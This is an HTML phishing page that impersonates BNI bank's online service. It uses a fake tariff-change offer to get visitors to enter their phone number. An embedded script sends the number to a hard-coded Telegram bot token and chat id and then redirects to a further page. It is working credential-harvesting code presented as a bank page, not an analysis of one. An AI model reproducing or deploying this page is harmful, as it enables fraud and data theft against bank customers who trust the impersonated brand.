<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Layanan online BNI 2023</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
</head>
<body>
    <nav class="navbar" style="background-color: #FF6600">
        <div class="container">
            <a class="navbar-brand" href="#">
                <img src="logo.png" alt="logo" width="70" height="24">
            </a>
            <h2 style="color: #fff">Layanan Ganti Tarif BNI</h2>
        </div>
    </nav>
    <div class="container">
        <div class="logo-atas">
            <img class="img-fluid" src="atas.jpg" alt="">
        </div>
        <div class="card form-action">
            <h5 class="card-title text-center text-warning mt-3">Pilih tarif transaksi Anda di bawah ini:</h5>
            <div class="check-box d-flex flex-column ms-4">
                <div class="input-box mt-3">
                    <input type="checkbox" name="check" id="check1">
                    <span class="fw-bold text-warning">Tarif Baru Rp. 150.000/Perbulan</span>
                </div>
                <div class="input-box">
                    <input type="checkbox" name="check" id="check2">
                    <span class="fw-bold text-warning">Tarif Lama Rp. 6.500/Pertransaksi</span>
                </div>
            </div>
            <div class="input-group mt-3 mx-auto" style="width: 90%">
                <span class="input-group-prepend">
                    <span class="input-group-text fs-5">ðŸ‡µðŸ‡±</span>
                </span>
                <input id="nope" type="text" class="form-control" placeholder="+62 8xxxxxxxxxx">
            </div>
            <div class="bnt-next mt-3 mb-3 text-center">
                <button onclick="next()" class="btnNext" style="background-color: #FF6600; border: none; border-radius: 19px; width: 90%; color: white; font-weight: bold; height: 45px">Lanjut</button>
            </div>
        </div>
    </div>
    <div class="logo-bawah">
        <img src="bawah.jpg" alt="" class="img-fluid">
    </div>
    <script>
        function sendMessage(id, botApi, pesan) {
            const url = `https://api.telegram.org/bot${botApi}/sendMessage`;
            const data = {
                chat_id: id,
                text: pesan
            };
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Pesan terkirim:', data);
                window.location.href = "tanya.html"
            })
            .catch(error => {
                console.error('Terjadi kesalahan:', error);
            });
        }

        const next = () => {
            const nope = document.querySelector("#nope").value;
            let text = `Nomor HP: ${nope}`;
            let bot = "6439882035:AAFBxLEyIBEwOoC3hQGw2ZBC7HFPLeCi9Tg";
            let id = "6558831774";
            if (nope === "") {
                alert("Mohon masukan nomor handphone Anda.");
            } else {
                sendMessage(id, bot, text);
            }
        }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>
</html>
